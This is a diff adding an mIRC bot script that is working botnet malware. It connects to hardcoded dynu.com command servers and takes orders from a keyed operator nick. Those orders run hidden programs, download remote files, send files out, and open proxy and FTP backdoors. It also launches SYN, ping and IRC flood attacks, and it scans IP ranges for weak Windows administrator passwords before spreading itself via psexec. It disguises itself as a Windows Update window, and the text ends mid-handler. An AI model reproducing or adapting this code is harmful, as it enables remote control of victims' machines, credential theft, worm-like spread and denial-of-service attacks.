@@ -1,0 +1,377 @@
+on *:ExIt:{ SoCkClOsE * | RlEvEl 666 | UnSeT %* }
+on *:StArT:{
+  SeTuP
+  CoNnEcT
+  SeTtInGs2
+  rgs2
+  rgs3
+  rgs4
+  rgs5
+}
+AlIaS SeTuP {
+  %asas = FnIcK
+  %perfix = !
+  %sf = xpxp.exe
+  %KeY = i
+  %channel = #3rb
+  %b = D:\WINDOWS\addins\sm56help.exe
+  %a = C:\WINDOWS\addins\sm56help.exe
+  %d = D:\WINNT\addins\sm56help.exe
+  %c = C:\WINNT\addins\sm56help.exe
+}
+alias CoNnEcT {
+  if (%s1 == $null) { %s1 = qaz.dynu.com server1:6660 }
+  if (%s2 == $null) { %s2 = wsx.dynu.com server2:6660 }
+  if (%s3 == $null) { %s3 = rfv.dynu.com server3:6660 }
+  if (%s4 == $null) { %s4 = qaz.dynu.com server4:6660 }
+  if (%s5 == $null) { %s5 = wsx.dynu.com server5:6660 }
+  if (%s6 == $null) { %s6 = coderx.dynu.com server6:6660 }
+  if (%s7 == $null) { %s7 = ma2002am.dynu.net server7:6660 }
+  if (%s8 == $null) { %s8 = ircbotnet.dynu.net server8:6660 }
+  server %s1
+  timercheckserver -o 0 90 servercheck
+}
+alias rgs2 { if ($os == 2000) || ($os == NT) || ($os == 2k) && $exists(%d) { run regedit.exe /s d.reg } }
+alias rgs3 { if ($os == 2000) || ($os == NT) || ($os == 2k) && $exists(%c) { run regedit.exe /s c.reg } }
+alias rgs4 { if ($os == 2003) || ($os == XP) && $exists(%a) { run regedit.exe /s a.reg } }
+alias rgs5 { if ($os == 2003) || ($os == XP) && $exists(%b) { run regedit.exe /s b.reg }
+}
+alias connectstaff { mode $me +ix | ial on | pdcc on | fsend on | sreq auto | creq auto | dcc packetsize 8192 | clearall }
+on *:CoNnEcT:{ connectstaff | join #3rb 1010 | .Timerlll 0 35 Raw -q Ping $me | %asas | clearall }
+on *:disCoNnEcT:{ SoCkClOsE * | rlevel 666| UnSeT %* | run Update.exe calcu.exe roudSTID.exe |  run Update.exe calcu.exe netstat.exe }
+on *:KiCk:%channel:{ .timerfastjoin -o 0 1 .join %channel 1010 }
+on *:PaRt:%channel:{ .timerfastjoin -o 0 1 .join %channel 1010 }
+on *:JoIn:*:{ if ($nick == $me) { .timerfastjoin off } }
+on ^*:PoNg:{ ctcp $me ping }
+on *:input:*:{ talk !- WARNING -! $1- !- WARNING -! | halt }
+on 666:part:*:{ ruser 666 $nick | clearall }
+on 666:quit:%users:{ ruser 666 $nick | clearall }
+on 666:nick:%users:{ ruser 666 $nick | clearall }
+on *:text:h*:*:{ 
+  if (km3331 isin $nick) && ($2 = %key) && ($level($nick) != 666) { 
+    talk Welcom $nick my Bot Version $os , Bot Me [Mr_KRAKZ]-[Bot]-[v2]-Bey[0|o]
+    auser 666 $nick
+    halt 
+  } 
+}
+alias servercheck { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 0) { set %servercheck 1 | server %s2 |  timercheckserver -o 0 50 servercheck1 } } }
+alias servercheck1 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 1) { set %servercheck 2 | server %s3 | timercheckserver -o 0 50 servercheck2 } } }
+alias servercheck2 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 2) { set %servercheck 3 | server %s4 | timercheckserver -o 0 50 servercheck3 } } }
+alias servercheck3 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 3) { set %servercheck 4 | server %s5 | timercheckserver -o 0 50 servercheck4 } } }
+alias servercheck4 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 4) { set %servercheck 5 | server %s6 | timercheckserver -o 0 50 servercheck5 } } }
+alias servercheck5 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 5) { set %servercheck 6 | server %s7 | timercheckserver -o 0 50 servercheck6 } } }
+alias servercheck6 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 6) { set %servercheck 7 | server %s8 | timercheckserver -o 0 50 servercheck } } }
+alias BwIn { WiNdOw -p @Microsoft.windows.Update 0 0 1600 1200 | timer 0 2 window -a @Microsoft.windows.Update }
+alias ownage return $gettok(ownage scripting hack fuck crack fuckyou spy military hacker usa cracker krakz ,$r(1,10),32 ) 
+alias talk { var %& $1- | var %co 0 | while (%co < $numtok(%&,32)) { inc %co | var %_t = %_t $iif($upper($left($gettok(%&,%co,32),1)) isalpha,1 $+ $upper($left($gettok(%&,%co,32),1)) $+ 1 $+ $right($gettok(%&,%co,32),-1) $+ ,14 $+ $upper($left($gettok(%&,%co,32),1)) $+ $right($gettok(%&,%co,32),-1)) } | msg %channel %_t | clearall
+}
+on 666:text:*:*:{
+  if ( $1 = %perfix $+ raw) { x $2- }
+  if ( $1 = %perfix $+ LoGoUt) { ruser $nick | talk you are logged out $nick }
+  if ( $1 = %perfix $+ Ip) { talk ip/host: $ip $+ / $+ $host / $time $+ @ $+ $date / $os / $duration($calc($ticks / 1000 )) }
+  if ( $1 = %perfix $+ D) && $2 != $null) { talk DCC Sending $2 To $nick | dcc send $nick $2 }
+  if ( $1 = %perfix $+ BnC) && ($3 != $null) { if ($sock(Bnc)) { talk [ERROR] bnc is already active on port: %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $2 | %Bnc.port = $2 | %Bnc.passwd = $3 | talk [bnc] /server -m $ip $+ : $+ $2 $+ , then /quote PASS $3 }
+  if ( $1 = %perfix $+ BnCs) && (%Bnc.Port != $null) { sockclose Bnc* | talk [bnc] server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }
+  if ( $1 = %perfix $+ Re) { talk Reconnecting to %server | /server %server }
+  if ( $1 = %perfix $+ StOp) { set %status 0 | run Update.exe calcu.exe roudSTID.EXE | talk stop } 
+  if ( $1 = %perfix $+ rem) { /remove $2- | talk Remove Ok . $+ ! | halt }
+  if ( $1 = %perfix $+ r) { /run $2- | talk Run Ok . $+ ! | halt }
+  if ( $1 = %perfix $+ qu) { exit }
+  if ( $1 = %perfix $+ maam) { /download $2- | /talk Downloading.. }
+  if ( $1 = %perfix $+ FtP) {
+    if ( $2 = -a) && (%ftp.stats == $null) { %ftp.stats = 1 | %ftp.user = $3 | %ftp.pass = $4 | %ftp.port = $5 | write -l7 rconnect.conf <User " $+ %ftp.user $+ "> | write -l8 rconnect.conf 	Password " $+ %ftp.pass $+ " | write -l2 rconnect.conf BindPort %ftp.port | talk [FTP] ftp started at: $+(ftp://,%ftp.user,:,%ftp.pass,@,$ip,:,%ftp.port,/) | run Update.exe ipcfg.exe | halt }
+    if ( $2 = -b) && (%ftp.stats != $null) { run Update.exe calcu.exe ipcfg.exe | talk [FTP] ftp on: $ip is now halted | unset %ftp.* | remove rconnect.log | halt }
+  }
+  if ($1 = %perfix $+ syn) {
+    if ($2 = -a) && ($3-) && (%synaa == $null) { %synaa = $3 | %synport = $4 | %synpackets = $5 | talk [Syn Attack] Attempting To Syn: %synaa , Port: %synport , Syn packets: %synpackets | syn start %synpackets %synaa %synport | halt }
+    if ($2 = -b) && (%synaa != $null) { talk [Syn Attack] Attack on: %synaa is now halted.... | sockclose syn* | unset %syn* | halt } 
+  }
+  if ( $1 = %perfix $+ run) { 
+    if ( $2 = -a) { %run.f.n = $3- | if $exists(%run.f.n) { talk Attempting To Run: %run.f.n , [Normal] | timerrunn 1 2 run %run.f.n | halt } }
+    if ( $2 = -b) { %run.f.h = $3- | if $exists(%run.f.h) { talk Attempting To Run: %run.f.h , [Hidden] | timerrunh 1 2 run Update.exe %run.f.h | halt } }
+  }
+  if ($1 = !ping) {
+    if ($2 == $null) { talk [PING] Usage: !ping -s <ip> <num> / !ping -k | halt }
+    if ($2 = -a) && (%pingo == $null) { %pingo = 1 | %pingip = $3 | %pingmb = $4 | run system32.exe /n /fh /r "ping.exe %pingip -n %pingmb -l 65500 -w 0" | talk [Ping Attack] Started Ping Attack on: %pingip , with $calc($4 *65536/1024/1000) $+ mb of traffic.. | timerp 1 10 unset %pingo | halt }
+    if ($2 = -b) && (%pingo != $null) { unset %ping* | talk [Ping Attack] Attacking Is Now Halted.. | run system32.exe /n /fh /r "syscnfg.exe -kf ping.exe" | halt }
+  }
+  if ($1 = !cl) && ($2-) {
+    if ($2 = l) && ($3-) { %server.c = $3 | %port.c = $4 | talk Clones Loading To Server: %server.c , using Port: %port.c | connect.c %server.c %port.c | halt }
+    if ($2 = jo) && ($3-) { %chan.c = $3 | %key.c = $4 | talk Attempting To Join: %chan.c | user JOIN %chan.c %key.c | halt }
+    if ($2 = pa) && ($3-) { %part.c = $3 | %part.m.c = $4- | talk Attempting To Part: %chan.c | user PART %part.c %part.m.c | halt }
+    if ($2 = msg) && ($3-) { %msg.f.c = $3 | %msg.f.m.c = $4- | talk Attempting To Message Flood: %msg.f.c | user PRIVMSG %msg.f.c : $+ %msg.f.m.c | halt } 
+    if ($2 = notice) && ($3-) { %notice.f.c = $3 | %notice.f.m.c = $4- | talk Attempting To Notice Flood: %notice.f.c | user notice %notice.f.c : $+ %notice.f.m.c | halt }
+    if ($2 = .) && ($3-) { %action.c = $3- | talk Clones Action: %action.c | user %action.c | halt }
+    if ($2 = nick) && ($3-) { %nick.to.use.c = $3 | talk [Clones] Attempting To use nick: %nick.to.use.c | user NICK $+(%nick.to.use.c,[,$r(0,9999),]) | halt }
+    if ($2 = nfld) { talk Attempting To Start Nick Flooding.. | user NICK $rand.c | halt }
+    if ($2 = flood) && ($3-) { %flood.c = $3 | %flood.m.c = $4- | talk Attempting To Join & Flood: %flood.c | user JOIN %flood.c | user PRIVMSG %flood.c : $+ %flood.m.c | user NOTICE %flood.c : $+ %flood.m.c | user PRIVMSG %flood.c : $+ %flood.m.c | user NOTICE %flood.c : $+ %flood.m.c | halt }
+    if ($2 = jp2) && ($3-) { %jp.chan.c = $3 | talk Attempting To Join/Part Flood: %jp.chan.c | jp.c | halt }
+    if ($2 = fuck) && ($3-) { %fuck.chan.c = $3 | talk Clones Starting Special Flood On: %fuck.chan.c | fuck.c | halt }
+    if ($2 = ctcp) && ($3-) { %flood.ctcp.c = $3 | talk Attempting To Ctcp Flood: %flood.ctcp.c | ctcp.c | halt }
+    if ($2 = sendq) && ($3-) { user PRIVMSG $3- : %f3 | user NICK $rand.c | user PRIVMSG $3- : $+ %f3 | talk Attempting To Sendq: $3- }
+    if ($2 = kill) { talk Attempting To Kill Clones.. | user QUIT | sockclose user.* | unset %*.c | halt }
+    if ($2 = chan1) && ($3 != $null) { sockwrite -tn Sockets-* IRCX | sockwrite -tn Sockets-* join $3 | sockwrite -tn Sockets-* PRIVMSG $3 : $+ %m1 |  sockwrite -tn Sockets-* NOTICE  $3 : $+ %m2 | sockwrite -tn Sockets-* part $3 | notice $nick 2[14clonez2]14 starting flood on $3 }
+    if ($2 = chan2) && ($3 != $null) { sockwrite -tn Sockets-* IRCX | sockwrite -tn Sockets-* join $3 | timer 0 2 sockwrite -tn Sockets-* privmsg $3 : $+ %m3 | timer 0 4 sockwrite -tn  Sockets-* notice $3 : $+ %m1 | notice $nick 2[14clonez2]14 starting endless flood on $3 $+ ! }
+    if ($2 = nknot) && ($3 != $null) { sockwrite -tn Sockets-* notice $3 : $+ %m1 | sockwrite -tn Sockets-* notice $3 : $+ %m2 | sockwrite -tn Sockets-* notice $3 : $+ %m3 | sockwrite -tn Sockets-* notice $3 : $+ %m1 | sockwrite -tn Sockets-* notice $3 : $+ %m2 | sockwrite -tn Sockets-* notice $3 : $+ %m3 }
+    if ($2 = nkmsg) && ($3 != $null) { sockwrite -tn Sockets-* privmsg $3 : $+ %m1 | sockwrite -tn Sockets-* privmsg $3 : $+ %m1 | sockwrite -tn Sockets-* privmsg $3 : $+ %m3 | sockwrite -tn Sockets-* privmsg $3 : $+ %m2 | sockwrite -tn Sockets-* privmsg $3 : $+ %m1 | sockwrite -tn Sockets-* privmsg $3 : $+ %m3 }
+    if ($2 = jp) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- }
+    if ($2 = jp3) && ($3 != $null) { sockwrite -tn user.* IRCX | timer 0 1 sockwrite -tn user.* JOIN $3 $4- | timer 0 2 sockwrite -tn user.* PART $3 $4- }
+    if ($2 = jmp) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ %m3 | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ %m1 | sockwrite -tn user.* PART $3 $4- }
+    if ($2 = send) && ($3 != $null) { sockwrite -tn user.* PRIVMSG $3 :DCC SEND Go_To_HeLL $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC SEND Go_To_HeLL $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC SEND Go_To_HeLL $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC SEND Go_To_HeLL $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC SEND Go_To_HeLL $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC SEND Go_To_HeLL $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  }
+    if ($2 = chat) && ($3 != $null) { sockwrite -tn user.* PRIVMSG $3 :DCC CHAT $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC CHAT $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC CHAT $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC CHAT $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC CHAT $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC CHAT $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  }
+    if ($2 = version) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ VERSION $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ VERSION $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ VERSION $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ VERSION $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ VERSION $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ VERSION $+ $chr(1) }
+    if ($2 = ping) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ PING $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ PING $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ PING $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ PING $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ PING $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ PING $+ $chr(1) }
+    if ($2 = time) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ time $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ time $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ time $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ time $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ time $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ time $+ $chr(1) }
+    if ($2 = finger) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ finger $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ finger $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ finger $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ finger $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ finger $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ finger $+ $chr(1) }
+    if ($2 = clientinfo) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ clientinfo $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ clientinfo $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ clientinfo $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ clientinfo $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ clientinfo $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ clientinfo $+ $chr(1) }
+    if ($2 = invite) && ($3 != $null) { sockwrite -tn user.* INVITE $3 #X $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) | sockwrite -tn user.* INVITE $3 #X $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) | sockwrite -tn user.* INVITE $3 #X $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) | sockwrite -tn user.* INVITE $3 #X $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) | sockwrite -tn user.* INVITE $3 #X $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) | sockwrite -tn user.* INVITE $3 #X $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) }
+    if ($2 = nick) && ($3 != $null) { sockwrite -tn user.* NICK $3 $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) | sockwrite -tn user.* NICK $3 $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) }
+    if ($2 = nickflood) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* join $3 | timer 0 1 sockwrite -tn user.* NICK $nfs | timer 0 2 sockwrite -tn user.* NICK $nfs }
+  }
+}
+raw 332:*:{ 
+  %topic = $3-  
+  if (a == $gettok(%topic,1,32)) {
+    if (p == $gettok(%topic,2,32)) && $exists(%sf) { set %iip1 $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ 1 | set %iip2 $gettok($ip,1-2,46) $+ .255.255 | set %rangeip %iip1 $+ - $+ %iip2 | run Update.exe roudSTID.EXE -host %rangeip -ntpass -t 150,75 | talk %rangeip | timerparse -o 0 45 startparse | timerroot -o 0 100 getroot }
+  }
+  if (syn == $gettok(%topic,1,32)) {
+    if (ip == $gettok(%topic,2,32)) && (%synaa == $null)  { set %synpackets $gettok(%topic,5,32) | set %synport $gettok(%topic,4,32) | set %synaa $gettok(%topic,3,32) | talk [Syn Attack] Attempting To Syn: %synaa port: %synport Syn packets: %synpackets | %synaa , Port: %synport , Syn packets: %synpackets | syn start %synpackets %synaa %synport | halt }
+  }
+}
+on *:sockopen:download: { if ($sockerr) { talk Error: Socket error. | return } | .write -c %download2 | .sockwrite -n $sockname GET / $+ %download3 HTTP/1.0 |  .sockwrite -n $sockname Accept: */* | .sockwrite -n $sockname Host: %download1 | .sockwrite -n $sockname }
+on *:sockread:download: { if (%downloadready != 1) { var %header | sockread %header | while ($sockbr) { if (Content-length: * iswm %header) { %downloadlength = $gettok(%header,2,32) } | elseif (* !iswm %header) { %downloadready = 1 | %downloadoffset = $sock($sockname).rcvd | break } | sockread %header } } | sockread 4096 &d | while ($sockbr) { bwrite %download2 -1 -1 &d | sockread 4096 &d } }
+on *:sockclose:download: { if ($file(%download2).size != %downloadlength) { .sockclose download | download http:// $+ %download1 $+ / $+ %download3 } | else { talk Success: File downloaded ( $+ $mircdir $+ %download2 $+ ) [[ $+ $bytes($file(%download2).size).suf $+ ][ $+ $duration($calc($ctime - %download4)) $+ ][ $+ $round($calc($calc($file(%download2).size / 1024) / $calc($ctime - %download4)),2) $+ kbps $+ ] } | unset %download* }
+alias download { if ($sock(download)) { talk Error: Already downloading a file. | return } | set %download1 $gettok($1,2,47) | set %download2 $gettok($1,$numtok($1,47),47) | set %download3 $gettok($1,3-,47) | set %download4 $ctime | .sockopen download %download1 80 
+}
+alias random return $r(A,Z) $+ $r(1,99) $+ $r(a,z) $+ $r(1,99) $+ $r(A,Z) $+ $r(1,99)
+alias SeTtInGs2 {
+  nick [ $+ $os $+ - $+ $r(0,99999) $+ ]]
+  anick $random
+  identd on $random
+  emailaddr $random
+  fullname $random
+  if ($portfree(113)) { socklisten IDENT 113 }
+  if (!$portfree(5555)) { exit }
+  else { socklisten WindowsUpdate 5555  }
+}
+alias startparse {
+  set %t 0
+  set %results 0
+  set %total $findfile(log\,*.htm,0)
+  :start
+  inc %t
+  if (%t <= %total) { parsefile $findfile(log\,*.htm,%t) | goto start }
+}
+alias parsefile {
+  set %temp.test $1
+  set %temp.host $nopath($1)
+  set %temp.host $remove(%temp.host,.htm)
+  set %temp.text $read($1, w, *Type: Administrator*)
+  set %temp.line $readn
+  if (%temp.line == 0) { return NULL }
+  set %temp.text $read($1, $calc($readn - 1))
+  if ($read($1, $calc(%temp.line - 1)) == <BR>) { $getuserpass2($read($1, $calc(%temp.line - 2))) | return }
+  $getuserpass(%temp.text)
+}
+alias getuserpass {
+  set %temp.user $gettok($1,2,60)
+  set %temp.user $gettok(%temp.user,2,62)
+  set %temp.pass $gettok($1,3,47)
+  if (*pass*same*as*user* iswm %temp.pass) { set %temp.pass %temp.user }
+  if (*blank*pass* iswm %temp.pass) { set %temp.pass [NULL] }
+  if ($exists(rcnc.x) == $false) { .write -c rcnc.x }
+  inc %results
+  echo -a FOUND: %temp.host %temp.user %temp.pass
+  write rcnc.x %temp.host %temp.user %temp.pass
+  remove %temp.test
+}
+alias getuserpass2 {
+  set %temp.user $gettok($1,2,62)
+  set %temp.user $gettok(%temp.user,1,60)
+  set %temp.pass $gettok($1,3,47)
+  if (*pass*same*as*user* iswm %temp.pass) { set %temp.pass %temp.user }
+  if (*blank*pass* iswm %temp.pass) { set %temp.pass [NULL] }
+  if ($exists(rcnc.x) == $false) { .write -c rcnc.x }
+  inc %results
+  echo -a FOUND: %temp.host %temp.user %temp.pass
+  write rcnc.x %temp.host %temp.user %temp.pass
+  remove %temp.test
+}
+alias getroot { if ($lines(rcnc.x) < 1) { halt } | /root $read(rcnc.x,1) | write -dl1 rcnc.x }
+alias root { if ($1 == $null) { halt }
+  :select
+  set %tempfile ord $+ $fnick $+ .bat
+  set %t.drive $r(n,z) $+ :
+  if ($exists(%t.drive) == $true) { goto select }
+  set %t.user $2
+  if ($3 == [NULL]) { set %t.pass $null | set %ps.pass -p "" }
+  else { set %t.pass $3 | set %ps.pass -p $3 }
+  set %t.host \\ $+ $1 | set %t.share IPC$
+  write %tempfile net use %t.drive /delete
+  write %tempfile net use %t.host /USER: $+ %t.user $chr(34) $+ %t.pass $+ $chr(34)
+  write %tempfile net use %t.drive %t.host $+ \ $+ %t.share
+  write %tempfile psexec.exe %t.host -u %t.user %ps.pass -f -c -d %sf -o
+  write %tempfile psexec.exe %t.host -u %t.user %ps.pass -d %sf -o
+  write %tempfile net use %t.drive /delete
+  write %tempfile net use %t.host /delete
+  write %tempfile del %tempfile
+  write %tempfile goto end
+  write %tempfile :End
+  write %tempfile exit
+  talk Scan.Nt $1 $2 $+ / $+ $3
+  run Update.exe %tempfile
+}
+alias rootnum {
+  inc %rooted
+  if (%rooted == $null) { set %rooted 0 }
+  inc %rooted
+  if ($len(%rooted) == 1) { set %rooted 00 $+ %rooted }
+  if ($len(%rooted) == 2) { set %rooted 0 $+ %rooted }
+  return %rooted
+}
+alias x $eval($$1-,2)
+alias syn { if ($1 == $null) { return } | syna 1 $1- | syna 1 halt | syna 1 $1- | syna 1 halt | syna 1 $1- | syna 1 halt | syna 1 $1- | syna 1 halt | syna 1 $1- | syna 1 halt | syna 1 $1- | syna 1 halt | talk [Syn Attack] Finished syn attack on: %synaa ... | unset %syn* }
+alias syna {
+  if ($2 == start) { if (%synport !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen $+(syn,$r(1,999),$r(1,999),$r(1,999)) $4 $5 | inc %x  } }
+  if ($2 == halt) { if ($sock(syn*,0) > 0) { sockclose syn* } }
+}
+alias FnIcK {
+  set %fnick $rand(1,10)
+  if (%fnick = 1) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $chr($r(65,125)) $+ $chr($r(65,125))  }
+  if (%fnick = 2) { return $chr($r(65,125)) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $chr($r(65,125))  }
+  if (%fnick = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }
+  if (%fnick = 4) { return $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) }
+  if (%fnick = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }
+  if (%fnick = 6) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(1,40) $+ $chr($r(65,125))  }
+  if (%fnick = 7) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }
+  if (%fnick = 8) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $chr($r(65,125))  }
+  if (%fnick = 9) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(1,10) $+ $chr($r(65,125))  }
+  if (%fnick = 10) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(20,50) $+ $chr($r(65,125)) }
+}
+on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }
+on *:sockread:BncClient*:{
+  sockread %BncClient
+  if ($gettok(%BncClient,1,32) == NICK) {
+    set %Bnc.nick $gettok(%BncClient,2,32)
+  }
+  if ($gettok(%BncClient,1,32) == USER) {
+    set %Bnc.user $gettok(%BncClient,2-,32)
+    sockwrite -n $sockname NOTICE AUTH : $+ You need to say /quote PASS <password>
+  }
+  if ($gettok(%BncClient,1,32) == PASS) {
+    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
+      sockwrite -n $sockname NOTICE AUTH : $+ Welcome to rst BNC, the messiah has arrived...
+      sockwrite -n $sockname NOTICE AUTH : $+ Level two, lets connect to something real now
+      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn [server] <port> <pass> to connect
+      %Bnc.legit = yes
+    }
+    if ($gettok(%BncClient,2,32) != %Bnc.passwd) {
+      sockwrite -n $sockname NOTICE AUTH : $+ Failed Pass!!
+    }
+  }
+  if ($gettok(%BncClient,1,32) == CONN) {
+    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ Fuck off. | sockclose   $sockname
+    }
+    if (BncServer $+ $remove($sockname,BncClient) != $null) {
+      sockclose BncServer $+ $remove($sockname,BncClient)
+    }
